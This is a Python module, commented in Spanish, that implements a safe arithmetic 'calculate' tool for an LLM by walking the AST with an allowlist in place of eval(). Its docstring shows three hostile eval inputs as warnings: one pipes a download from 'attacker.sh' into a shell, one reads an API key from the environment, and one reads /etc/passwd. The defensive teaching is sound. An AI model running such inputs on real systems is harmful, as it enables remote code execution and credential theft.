"""La tool `calculate`, con un evaluador seguro.

La versión obvia es `return eval(expression)`, y eso es ejecución remota de
código: el string llega de un modelo que lo generó a partir de texto de un
usuario cualquiera, y `eval` lo corre en tu proceso, con tus variables de entorno
y tu acceso a la red y a la base.

    eval("__import__('os').system('curl attacker.sh | sh')")
    eval("__import__('os').environ['ANTHROPIC_API_KEY']")
    eval("open('/etc/passwd').read()")

Las tres son expresiones de Python válidas.

La regla, que vale para cualquier tool: una tool nunca EJECUTA el input, lo
INTERPRETA — parsea a una estructura y la recorre decidiendo nodo por nodo qué se
permite.
"""

import ast
import operator
from typing import Annotated

from pydantic import Field

from app.tools.registry import registry

# Antes de parsear: un parser también consume CPU, y una expresión de 10 MB es un
# ataque aunque después la rechaces.
MAX_EXPRESSION_LENGTH = 200

# Los enteros de Python no tienen límite de tamaño: `2 ** 999999999` se come toda
# la RAM calculando un número de cientos de megabytes.
MAX_POW_EXPONENT = 100

# Allowlist, no blocklist. Una blocklist exige haber pensado en todo lo
# peligroso, y un solo olvido te expone. Con allowlist, lo que no se te ocurrió
# se rechaza por default: los olvidos fallan cerrados.
_BINARY_OPS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.FloorDiv: operator.floordiv,
    ast.Mod: operator.mod,
}

_UNARY_OPS = {
    ast.UAdd: operator.pos,  # +5
    ast.USub: operator.neg,  # -5
}


@registry.tool
def calculate(
    expression: Annotated[
        str,
        Field(
            description=(
                "La expresión a evaluar, en sintaxis de Python. "
                "Ejemplos: '42 * 2', '(15 + 5) / 4', '2 ** 10'."
            )
        ),
    ],
) -> float:
    """Evalúa una expresión aritmética y devuelve el resultado numérico.

    Usala siempre que necesites hacer una cuenta, por simple que parezca: es
    exacta, mientras que calcular de memoria es propenso a errores.

    Soporta números, paréntesis y los operadores + - * / // % ** . No resuelve
    ecuaciones, ni álgebra simbólica, ni conversiones de unidades, ni funciones
    como raíz cuadrada o seno.
    """
    # La última frase del docstring —lo que NO hace— es la mitad que más se
    # olvida y la que evita que el modelo llame a la tool para algo que va a
    # fallar.
    if len(expression) > MAX_EXPRESSION_LENGTH:
        raise ValueError(f"expresión demasiado larga (máximo {MAX_EXPRESSION_LENGTH})")

    try:
        # mode="eval" limita el parseo a UNA expresión. Con el default
        # (mode="exec") aceptaría sentencias: asignaciones, import, def, un
        # programa entero.
        #
        # ast.parse NO ejecuta nada, sólo construye el árbol. Lo peligroso es la
        # built-in eval(), que es otra cosa.
        tree = ast.parse(expression, mode="eval")
    except SyntaxError as exc:
        raise ValueError(f"expresión inválida: {expression!r}") from exc

    try:
        return _evaluate(tree.body)
    except ZeroDivisionError as exc:
        # A ValueError para que arriba haya un solo tipo de error esperable que
        # contarle al modelo.
        raise ValueError("división por cero") from exc


def _evaluate(node: ast.AST) -> float:
    """Recorre el árbol permitiendo sólo nodos aritméticos.

    Recursivo porque el árbol lo es: en `2 * (3 + 4)`, el nodo de la
    multiplicación tiene adentro el de la suma.

    El `case _` final es el corazón: cualquier nodo que no esté explícitamente
    permitido —una llamada, un nombre, un atributo, un import— cae ahí.
    """
    match node:
        # bool es subclase de int en Python, así que `True + 1` pasa; es
        # inofensivo y no vale el chequeo extra.
        case ast.Constant(value=int() | float() as value):
            return value

        # La potencia va antes del caso general de BinOp porque necesita su
        # propia guarda: gana el primer `case` que matchea.
        case ast.BinOp(left=left, op=ast.Pow(), right=right):
            base = _evaluate(left)
            exponent = _evaluate(right)
            # Se chequea el valor calculado y no el literal: `2 ** (999 * 999)`
            # tiene un exponente chico escrito y gigante calculado.
            if abs(exponent) > MAX_POW_EXPONENT:
                raise ValueError(f"exponente demasiado grande (máximo {MAX_POW_EXPONENT})")
            return base**exponent

        case ast.BinOp(left=left, op=op, right=right) if type(op) in _BINARY_OPS:
            return _BINARY_OPS[type(op)](_evaluate(left), _evaluate(right))

        case ast.UnaryOp(op=op, operand=operand) if type(op) in _UNARY_OPS:
            return _UNARY_OPS[type(op)](_evaluate(operand))

        case _:
            # El mensaje nombra el tipo de nodo (Call, Name, Attribute) porque lo
            # lee el modelo: con eso entiende que se le pide aritmética pura y
            # reescribe la expresión.
            raise ValueError(
                f"operación no permitida en una expresión aritmética: "
                f"{type(node).__name__}"
            )
